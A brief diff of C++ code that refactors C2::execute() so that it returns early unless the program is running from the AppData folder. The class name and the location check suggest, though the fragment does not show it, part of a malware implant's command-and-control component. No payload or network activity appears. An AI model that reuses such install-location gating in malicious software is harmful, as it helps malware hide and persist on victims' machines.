@@ -25,10 +25,8 @@ void C2::cleanup() {
 }
 
 void C2::execute() {
-	string path = this->util.getAppDataPath();
-	string dire = this->util.getCurrentDirectory();
-
-	if (path != dire) {
+	
+	if (!this->util.isInAppData()) {
 		return;
 	}
 
